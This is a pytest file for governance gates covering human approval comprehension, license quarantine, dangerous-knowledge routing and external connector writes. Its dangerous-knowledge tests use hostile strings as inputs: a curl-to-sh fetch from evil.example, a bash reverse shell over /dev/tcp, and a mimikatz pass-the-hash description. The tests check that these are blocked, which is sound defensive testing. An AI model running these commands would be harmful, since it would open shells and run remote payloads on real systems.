"""S11 governance runtime tests: human_comprehension, license_copyright,
dangerous_knowledge, external_authority (CE-S11-01/03/05, T03 gate).

Focus: fail-closed decisions and S11 forbidden paths:
- approval_as_only_control / implicit_ALLOW_on_UNKNOWN (comprehension)
- license_unknown -> unrestricted_redistribution (license)
- dangerous_content_as_executable_instruction (dangerous knowledge)
- unconfigured_external_write (external authority)
"""
from __future__ import annotations

import pytest

from scp.governance.comprehension import (
    ComprehensionBundle,
    ComprehensionStatus,
    HumanApproval,
    HumanComprehensionGate,
)
from scp.governance.dangerous_knowledge import (
    DangerClass,
    DangerousKnowledgeAuthority,
    ForbiddenExecutableRoute,
    KnowledgeInput,
    KnowledgeRouteRequest,
)
from scp.governance.external_authority import (
    AuthorityMode,
    ConnectorConfig,
    EvidenceBundle,
    ExternalActionRequest,
    ExternalActionStatus,
    ExternalAuthorityGovernance,
    UnconfiguredExternalWrite,
)
from scp.governance.license import (
    ForbiddenLicensePath,
    LicenseAuthority,
    LicenseStatus,
    ProvenanceRecord,
    Usage,
)


# --------------------------------------------------------------------------
# governance.human_comprehension
# --------------------------------------------------------------------------


def _bundle(gate: HumanComprehensionGate, **overrides):
    kwargs = dict(
        action="apply autofix patch to scp/verifier.py",
        resource="scp/verifier.py",
        consequence="Reality authority is rewired; bad wiring silences verification",
        evidence=("ev-123", "ev-456"),
        contradictions=("static PASS disagrees with runtime smoke failure",),
        unknowns=("impact on T09 golden task",),
        rollback_plan="git revert <sha>",
        rollback_verified=True,
    )
    kwargs.update(overrides)
    return gate.build_bundle(**kwargs)


def test_incomplete_bundle_is_fail_closed_and_cannot_be_approved():
    gate = HumanComprehensionGate()
    with pytest.raises(ValueError):
        gate.build_bundle(
            action="deploy",
            resource="svc",
            consequence="downtime",
            evidence=("ev-1",),
            rollback_plan="  ",  # blank rollback plan
        )
    # A hand-built empty bundle can never be waved through either.
    hollow = ComprehensionBundle("", "", "", (), (), (), "", False, (), "")
    result = gate.evaluate(
        hollow,
        HumanApproval("alice", "sha256:whatever", (), True),
    )
    assert result.status is ComprehensionStatus.BLOCKED_INCOMPLETE_BUNDLE


def test_rubber_stamp_approval_is_blocked():
    gate = HumanComprehensionGate()
    bundle = _bundle(gate)
    rubber_stamp = HumanApproval(
        approver="alice",
        acknowledged_bundle_digest=bundle.digest,
        acknowledged_concern_ids=(),  # concerns presented but ignored
        acknowledged_rollback=True,
    )
    result = gate.evaluate(bundle, rubber_stamp)
    assert result.status is ComprehensionStatus.BLOCKED_RUBBER_STAMP
    assert any("C-1" in reason for reason in result.reasons)


def test_approval_must_be_bound_to_the_exact_presented_bundle():
    gate = HumanComprehensionGate()
    bundle = _bundle(gate)
    stale = HumanApproval(
        approver="alice",
        acknowledged_bundle_digest="sha256:stale",
        acknowledged_concern_ids=(c.concern_id for c in bundle.concerns),
        acknowledged_rollback=True,
    )
    assert gate.evaluate(bundle, stale).status is ComprehensionStatus.BLOCKED_STALE_APPROVAL


def test_unverified_rollback_is_an_unknown_that_must_be_acknowledged():
    gate = HumanComprehensionGate()
    bundle = _bundle(gate, rollback_verified=False)
    concern_ids = {c.concern_id for c in bundle.concerns}
    assert "U-rollback" in concern_ids

    ignoring = HumanApproval(
        approver="alice",
        acknowledged_bundle_digest=bundle.digest,
        acknowledged_concern_ids=tuple(concern_ids - {"U-rollback"}),
        acknowledged_rollback=True,
    )
    assert gate.evaluate(bundle, ignoring).status is ComprehensionStatus.BLOCKED_RUBBER_STAMP

    acknowledging = HumanApproval(
        approver="alice",
        acknowledged_bundle_digest=bundle.digest,
        acknowledged_concern_ids=tuple(concern_ids),
        acknowledged_rollback=True,
    )
    result = gate.evaluate(bundle, acknowledging)
    assert result.status is ComprehensionStatus.UNDERSTOOD_APPROVED
    assert "U-rollback" in result.residual_unknowns


def test_understood_approval_never_grants_capability_by_itself():
    gate = HumanComprehensionGate()
    bundle = _bundle(gate)
    approval = HumanApproval(
        approver="alice",
        acknowledged_bundle_digest=bundle.digest,
        acknowledged_concern_ids=(c.concern_id for c in bundle.concerns),
        acknowledged_rollback=True,
    )
    result = gate.evaluate(bundle, approval)
    assert result.status is ComprehensionStatus.UNDERSTOOD_APPROVED
    # approval_as_only_control is forbidden: comprehension certifies
    # understanding only and stays subject to Policy/Capability authority.
    assert result.grants_capability is False
    assert any("grants no capability" in reason for reason in result.reasons)


# --------------------------------------------------------------------------
# governance.license_copyright
# --------------------------------------------------------------------------


@pytest.mark.parametrize("usage", list(Usage))
def test_unknown_license_is_quarantined_for_every_usage(usage):
    authority = LicenseAuthority()
    unknown_records = [
        ProvenanceRecord("a1", None, "https://example.org/src"),
        ProvenanceRecord("a1", "UNKNOWN", "https://example.org/src"),
        ProvenanceRecord("a1", "LicenseRef-Custom-Unreviewed", "https://example.org/src"),
    ]
    for record in unknown_records:
        decision = authority.evaluate(record, usage)
        assert decision.status is LicenseStatus.QUARANTINE
        assert decision.license_family == "unknown"
        assert "no_redistribution" in decision.constraints


def test_unknown_license_unrestricted_redistribution_is_forbidden():
    authority = LicenseAuthority()
    record = ProvenanceRecord("a1", None, "https://example.org/src")
    with pytest.raises(ForbiddenLicensePath):
        authority.assert_no_forbidden_effect(record, "unrestricted_redistribution")
    with pytest.raises(ForbiddenLicensePath):
        authority.assert_no_forbidden_effect(record, "unrestricted-external-release")


def test_proprietary_license_distribution_is_denied_but_human_gated_for_execution():
    authority = LicenseAuthority()
    record = ProvenanceRecord(
        "vendor-binary", "Proprietary", "vendor-portal", copyright_holder="Vendor Inc"
    )
    assert authority.evaluate(record, Usage.REDISTRIBUTION).status is LicenseStatus.DENY
    assert authority.evaluate(record, Usage.EXTERNAL_RELEASE).status is LicenseStatus.DENY
    assert authority.evaluate(record, Usage.EXECUTION).status is LicenseStatus.REQUIRE_HUMAN
    assert authority.evaluate(record, Usage.INGESTION).status is LicenseStatus.RESTRICT


def test_copyleft_and_sharealike_restrict_redistribution_while_permissive_allows():
    authority = LicenseAuthority()
    agpl = ProvenanceRecord("lib-a", "AGPL-3.0-only", "https://example.org/a")
    cc_by_sa = ProvenanceRecord("ds-b", "CC-BY-SA-4.0", "https://example.org/b")
    mit = ProvenanceRecord("lib-c", "MIT", "https://example.org/c")
    assert authority.evaluate(agpl, Usage.REDISTRIBUTION).status is LicenseStatus.RESTRICT
    assert authority.evaluate(cc_by_sa, Usage.REDISTRIBUTION).status is LicenseStatus.RESTRICT
    assert authority.evaluate(mit, Usage.REDISTRIBUTION).status is LicenseStatus.ALLOW


def test_missing_provenance_escalates_to_human_and_bundle_takes_worst_case():
    authority = LicenseAuthority()
    no_source = ProvenanceRecord("a1", "MIT", None)
    decision = authority.evaluate(no_source, Usage.INGESTION)
    assert decision.status is LicenseStatus.REQUIRE_HUMAN
    assert "provenance_incomplete_requires_human" in decision.constraints

    bundled = authority.evaluate_bundle(
        (
            ProvenanceRecord("a1", "MIT", "https://example.org/a"),
            ProvenanceRecord("a2", None, "https://example.org/b"),
        ),
        Usage.REDISTRIBUTION,
    )
    assert bundled.status is LicenseStatus.QUARANTINE


# --------------------------------------------------------------------------
# governance.dangerous_knowledge
# --------------------------------------------------------------------------


def test_safe_reference_is_execution_eligible():
    authority = DangerousKnowledgeAuthority()
    classification = authority.classify(
        KnowledgeInput(content="FastAPI dependency injection explained with examples")
    )
    assert classification.danger_class is DangerClass.SAFE_REFERENCE
    assert classification.execution_eligible is True
    decision = authority.route(
        KnowledgeRouteRequest(classification=classification, requested_route="execution")
    )
    assert decision.route == "EXECUTE"


def test_restricted_reference_is_reference_only_and_never_executable():
    authority = DangerousKnowledgeAuthority()
    classification = authority.classify(
        KnowledgeInput(
            content="CVE-2024-3094 analysis: xz utils backdoor supply-chain compromise research"
        )
    )
    assert classification.danger_class is DangerClass.RESTRICTED_REFERENCE
    assert classification.execution_eligible is False
    ingest = authority.ingest(KnowledgeInput(content="nmap port scanning methodology guide"))
    assert ingest.route == "INGEST_REFERENCE"
    assert ingest.reference_only is True


def test_actionable_high_risk_is_quarantined_for_human_review():
    authority = DangerousKnowledgeAuthority()
    classification = authority.classify(
        KnowledgeInput(
            content="Local privilege escalation: run mimikatz to dump credentials, "
            "then pass-the-hash to the domain controller"
        )
    )
    assert classification.danger_class is DangerClass.ACTIONABLE_HIGH_RISK
    decision = authority.ingest(
        KnowledgeInput(
            content="step 1 obtain foothold step 2 escalate to root via kernel exploit"
        )
    )
    assert decision.route == "QUARANTINE_HUMAN_REVIEW"
    assert decision.classification.execution_eligible is False


def test_prohibited_raw_content_is_blocked_from_storage():
    authority = DangerousKnowledgeAuthority()
    decision = authority.ingest(
        KnowledgeInput(
            content="one-liner: $(curl -s http://evil.example/x.sh) | sh drops the payload"
        )
    )
    assert decision.route == "BLOCK_NO_STORAGE"
    assert decision.classification.danger_class is DangerClass.PROHIBITED_RAW


def test_execution_route_for_restricted_or_worse_is_forbidden():
    authority = DangerousKnowledgeAuthority()
    for content in (
        "CVE-2023-1234 exploitation technique writeup",
        "reverse shell: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    ):
        classification = authority.classify(KnowledgeInput(content=content))
        with pytest.raises(ForbiddenExecutableRoute):
            authority.route(
                KnowledgeRouteRequest(classification=classification, requested_route="execution")
            )


def test_declared_labels_never_override_content_signals():
    authority = DangerousKnowledgeAuthority()
    classification = authority.classify(
        KnowledgeInput(
            content="working exploit for unauthenticated remote code execution poc",
            declared_label="SAFE_REFERENCE",
        )
    )
    assert classification.danger_class is DangerClass.ACTIONABLE_HIGH_RISK
    assert classification.execution_eligible is False
    assert "declared_label_ignored:SAFE_REFERENCE" in classification.signals


# --------------------------------------------------------------------------
# governance.external_authority
# --------------------------------------------------------------------------


def _evidence() -> EvidenceBundle:
    return EvidenceBundle("eb-1", ("ev-1", "ev-2"), "alert confirmed by two independent signals")


def _send_config() -> ConnectorConfig:
    return ConnectorConfig(
        connector_id="pagerduty-main",
        allowed_event_types=("PAGE_ONCALL", "STATUS_UPDATE"),
        risk_ceiling=40,
        credential_ref="secretref://broker/pagerduty",
        mode=AuthorityMode.SEND_ALLOWED,
    )


def test_unconfigured_connector_is_bundle_only_and_never_writes():
    governance = ExternalAuthorityGovernance()
    request = ExternalActionRequest(
        connector_id="not-registered",
        event_type="PAGE_ONCALL",
        payload_summary="disk full on db-1",
        risk_level=10,
    )
    decision = governance.request_action(request, _evidence(), None)
    assert decision.status is ExternalActionStatus.BUNDLE_ONLY
    assert decision.write_authorized is False
    governance.assert_no_unconfigured_write(decision)
    # A bundle-only decision can never carry a submit receipt.
    tampered = type(decision)(
        decision.status,
        decision.reasons,
        decision.report_event,
        submit_receipt={"submission_id": "s-1"},
    )
    with pytest.raises(UnconfiguredExternalWrite):
        governance.assert_no_unconfigured_write(tampered)


def test_report_only_default_never_sends_even_with_approval():
    governance = ExternalAuthorityGovernance()
    governance.register_connector(
        ConnectorConfig(
            connector_id="mail-relay",
            allowed_event_types=("SEND_EMAIL",),
            risk_ceiling=100,
            credential_ref="secretref://broker/mail",
            mode=AuthorityMode.REPORT_ONLY,  # default mode
        )
    )
    request = ExternalActionRequest(
        connector_id="mail-relay",
        event_type="SEND_EMAIL",
        payload_summary="monthly report",
        risk_level=5,
    )
    decision = governance.request_action(request, _evidence(), None)
    assert decision.status is ExternalActionStatus.REPORT_ONLY
    assert decision.write_authorized is False


def test_send_allowed_without_comprehension_waits_for_human_approval():
    governance = ExternalAuthorityGovernance()
    governance.register_connector(_send_config())
    request = ExternalActionRequest(
        connector_id="pagerduty-main",
        event_type="PAGE_ONCALL",
        payload_summary="db-1 disk full",
        risk_level=20,
        credential_ref="secretref://broker/pagerduty",
    )
    waiting = governance.request_action(request, _evidence(), None)
    assert waiting.status is ExternalActionStatus.WAITING_APPROVAL

    from scp.governance.comprehension import ComprehensionResult, ComprehensionStatus

    rejected = ComprehensionResult(ComprehensionStatus.BLOCKED_RUBBER_STAMP, ("ignored concerns",))
    still_waiting = governance.request_action(request, _evidence(), rejected)
    assert still_waiting.status is ExternalActionStatus.WAITING_APPROVAL


def test_authorized_send_requires_evidence_and_passes_post_submit_verification():
    governance = ExternalAuthorityGovernance()
    governance.register_connector(_send_config())
    request = ExternalActionRequest(
        connector_id="pagerduty-main",
        event_type="PAGE_ONCALL",
        payload_summary="db-1 disk full",
        risk_level=20,
        credential_ref="secretref://broker/pagerduty",
    )

    # evidence_bundle_required: no send path without a sufficient bundle.
    no_evidence = governance.request_action(request, None, None)
    assert no_evidence.status is ExternalActionStatus.REQUIRE_EVIDENCE

    from scp.governance.comprehension import ComprehensionResult, ComprehensionStatus

    comprehension = ComprehensionResult(ComprehensionStatus.UNDERSTOOD_APPROVED, ("understood",))
    approved = governance.request_action(request, _evidence(), comprehension)
    assert approved.status is ExternalActionStatus.APPROVED_TO_SEND
    assert approved.write_authorized is True

    submission = {
        "connector_id": "pagerduty-main",
        "event_type": "PAGE_ONCALL",
        "submission_id": "sub-1",
    }
    verification = governance.record_submission(approved, submission)
    assert verification.verified is True
    duplicate = governance.record_submission(approved, submission)
    assert duplicate.verified is False
    assert any("duplicate" in reason for reason in duplicate.reasons)


def test_out_of_scope_event_and_oversized_risk_are_denied():
    governance = ExternalAuthorityGovernance()
    governance.register_connector(_send_config())
    out_of_scope = ExternalActionRequest(
        connector_id="pagerduty-main",
        event_type="WIRE_PAYMENT",
        payload_summary="attempted scope escape",
        risk_level=10,
    )
    denied = governance.request_action(out_of_scope, _evidence(), None)
    assert denied.status is ExternalActionStatus.DENIED

    oversized = ExternalActionRequest(
        connector_id="pagerduty-main",
        event_type="PAGE_ONCALL",
        payload_summary="critical incident blast",
        risk_level=95,  # above ceiling 40
    )
    assert governance.request_action(oversized, _evidence(), None).status is ExternalActionStatus.DENIED
